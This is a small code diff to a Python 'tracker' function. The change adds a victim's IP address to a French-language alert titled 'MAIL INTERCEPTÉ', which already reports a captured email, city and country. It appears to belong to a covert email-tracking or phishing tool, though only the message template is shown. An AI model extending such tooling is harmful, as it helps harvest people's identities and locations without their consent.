@@ -92,6 +92,7 @@ def tracker():
     message = f"""🎯 MAIL INTERCEPTÉ 📬
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 👤 Email: {email}
+🌐 IP: {ip}
 
 🌍 Ville: {city_display}
 🌐 Pays: {geo['country']}
